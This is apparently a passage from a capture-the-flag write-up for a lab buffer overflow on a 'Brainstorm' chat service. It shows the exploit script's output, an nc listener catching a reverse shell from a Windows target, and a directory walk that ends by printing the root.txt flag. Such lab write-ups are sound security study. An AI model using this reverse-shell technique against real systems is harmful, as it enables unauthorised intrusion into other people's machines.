
```sh
┌──(kali㉿kali)-[~/bof]
└─$ python3 brainstorm-exploit.py
b'Welcome to Brainstorm chat (beta)'
Sending user name
b'\nPlease enter your username (max 20 characters): '
Sending evil buffer...
Done!
```

```sh
┌──(kali㉿kali)-[~]
└─$ nc -nvlp 443
listening on [any] 443 ...
connect to [10.21.31.111] from (UNKNOWN) [10.10.227.252] 49293
Microsoft Windows [Version 6.1.7601]
Copyright (c) 2009 Microsoft Corporation.  All rights reserved.

C:\Windows\system32>cd../..
cd../..

C:\>dir
dir
 Volume in drive C has no label.
 Volume Serial Number is C87F-5040

 Directory of C:\

08/29/2019  08:36 PM    <DIR>          ftp
08/29/2019  08:31 PM    <DIR>          inetpub
07/13/2009  08:20 PM    <DIR>          PerfLogs
11/21/2010  12:16 AM    <DIR>          Program Files
08/29/2019  08:28 PM    <DIR>          Program Files (x86)
08/29/2019  10:20 PM    <DIR>          Users
09/02/2019  05:36 PM    <DIR>          Windows
               0 File(s)              0 bytes
               7 Dir(s)  19,692,036,096 bytes free

C:\>cd users
cd users

C:\Users>dir
dir
 Volume in drive C has no label.
 Volume Serial Number is C87F-5040

 Directory of C:\Users

08/29/2019  10:20 PM    <DIR>          .
08/29/2019  10:20 PM    <DIR>          ..
08/29/2019  10:21 PM    <DIR>          drake
11/21/2010  12:16 AM    <DIR>          Public
               0 File(s)              0 bytes
               4 Dir(s)  19,692,036,096 bytes free

C:\Users>cd drake
cd drake

C:\Users\drake>dir
dir
 Volume in drive C has no label.
 Volume Serial Number is C87F-5040

 Directory of C:\Users\drake

08/29/2019  10:21 PM    <DIR>          .
08/29/2019  10:21 PM    <DIR>          ..
08/29/2019  10:21 PM    <DIR>          Contacts
08/29/2019  10:55 PM    <DIR>          Desktop
08/29/2019  10:21 PM    <DIR>          Documents
08/29/2019  10:27 PM    <DIR>          Downloads
08/29/2019  10:21 PM    <DIR>          Favorites
08/29/2019  10:21 PM    <DIR>          Links
08/29/2019  10:21 PM    <DIR>          Music
08/29/2019  10:21 PM    <DIR>          Pictures
08/29/2019  10:21 PM    <DIR>          Saved Games
08/29/2019  10:21 PM    <DIR>          Searches
08/29/2019  10:21 PM    <DIR>          Videos
               0 File(s)              0 bytes
              13 Dir(s)  19,692,036,096 bytes free

C:\Users\drake>cd desktop
cd desktop

C:\Users\drake\Desktop>dir
dir
 Volume in drive C has no label.
 Volume Serial Number is C87F-5040

 Directory of C:\Users\drake\Desktop

08/29/2019  10:55 PM    <DIR>          .
08/29/2019  10:55 PM    <DIR>          ..
08/29/2019  10:55 PM                32 root.txt
               1 File(s)             32 bytes
               2 Dir(s)  19,692,048,384 bytes free

C:\Users\drake\Desktop>type root.txt
type root.txt
5b1001de5a44eca47eee71e7942a8f8a
C:\Users\drake\Desktop>
```

